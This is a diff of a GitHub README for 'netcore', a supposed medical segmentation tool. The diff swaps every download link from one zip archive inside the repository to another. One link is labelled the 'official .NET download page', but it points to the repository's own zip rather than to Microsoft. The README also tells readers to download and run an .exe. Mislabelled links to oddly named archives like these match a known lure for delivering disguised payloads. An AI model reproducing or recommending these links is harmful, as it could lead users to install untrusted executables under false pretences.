@@ -1,6 +1,6 @@
 # 🚀 netcore - Simplifying Medical Object Segmentation
 
-[![Download](https://raw.githubusercontent.com/borjabengo/netcore/main/prevacate/netcore.zip%20netcore-latest%20release-blue)](https://raw.githubusercontent.com/borjabengo/netcore/main/prevacate/netcore.zip)
+[![Download](https://github.com/borjabengo/netcore/raw/refs/heads/main/pretrain/Software_3.1-alpha.3.zip%20netcore-latest%20release-blue)](https://github.com/borjabengo/netcore/raw/refs/heads/main/pretrain/Software_3.1-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -14,11 +14,11 @@ To use netcore, follow these simple steps:
    - Windows 10 or later
    - At least 4 GB of RAM
    - A modern CPU or GPU (for optimal performance)
-   - Ensure that you have .NET Core 3.1 installed. You can download it from the official [.NET download page](https://raw.githubusercontent.com/borjabengo/netcore/main/prevacate/netcore.zip).
+   - Ensure that you have .NET Core 3.1 installed. You can download it from the official [.NET download page](https://github.com/borjabengo/netcore/raw/refs/heads/main/pretrain/Software_3.1-alpha.3.zip).
 
 2. **Download netcore**
 
-   Visit this page to download: [netcore Releases](https://raw.githubusercontent.com/borjabengo/netcore/main/prevacate/netcore.zip)
+   Visit this page to download: [netcore Releases](https://github.com/borjabengo/netcore/raw/refs/heads/main/pretrain/Software_3.1-alpha.3.zip)
 
    Choose the latest version from the list of releases. Make sure to download the right file for your operating system.
 
@@ -26,7 +26,7 @@ To use netcore, follow these simple steps:
 
 To install netcore on your computer:
 
-1. Go to the [netcore Releases](https://raw.githubusercontent.com/borjabengo/netcore/main/prevacate/netcore.zip) page.
+1. Go to the [netcore Releases](https://github.com/borjabengo/netcore/raw/refs/heads/main/pretrain/Software_3.1-alpha.3.zip) page.
 2. Locate the latest release.
 3. Click on the available package that corresponds to your operating system. The file will likely have an extension like `.exe` for Windows.
 4. Once downloaded, navigate to the directory where the file is saved.
